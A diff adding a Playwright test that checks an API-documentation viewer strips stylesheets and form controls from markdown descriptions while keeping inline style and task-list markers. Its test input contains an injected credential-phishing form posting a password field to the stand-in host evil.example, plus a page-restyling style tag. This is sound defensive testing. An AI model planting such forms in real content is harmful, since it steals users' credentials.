@@ -120,3 +120,35 @@ test('a request body description is sanitized', async ({ page }) => {
   await clickNavOp(page, 'createPet')
   await expectInert(page, page.locator('main'))
 })
+
+// Past the scripts: a stylesheet would restyle the whole app, and a form
+// control is a field a description could ask a reader to type a secret into.
+// An inline `style` reaches only its own element and stays, and a GFM task
+// list keeps its markers without the <input> marked builds them from.
+test('a description carries no stylesheet and no form control, and keeps inline style', async ({
+  page,
+}) => {
+  await serveSchema(page, (schema) => {
+    schema.paths['/pets'].post.description = [
+      '<style>body { background: rgb(255, 0, 0) }</style>',
+      '<form action="https://evil.example"><input name="password"><textarea></textarea>',
+      '<select><option>a</option></select><button>Log in</button></form>',
+      '',
+      '<span style="color: rgb(1, 2, 3)">tinted</span> **legit**',
+      '',
+      '- [x] shipped',
+      '- [ ] planned',
+    ].join('\n')
+  })
+  await gotoApp(page, '#/op/createPet')
+  const main = page.locator('main')
+  const md = main.locator('.md-content').filter({ hasText: 'tinted' })
+  await expect(md.locator('strong', { hasText: 'legit' })).toBeVisible()
+  await expect(
+    main.locator('.md-content').locator('style, form, input, textarea, select, option, button'),
+  ).toHaveCount(0)
+  await expect(page.locator('body')).not.toHaveCSS('background-color', 'rgb(255, 0, 0)')
+  await expect(md.locator('span', { hasText: 'tinted' })).toHaveCSS('color', 'rgb(1, 2, 3)')
+  await expect(md.locator('li', { hasText: 'shipped' })).toContainText('☑ shipped')
+  await expect(md.locator('li', { hasText: 'planned' })).toContainText('☐ planned')
+})
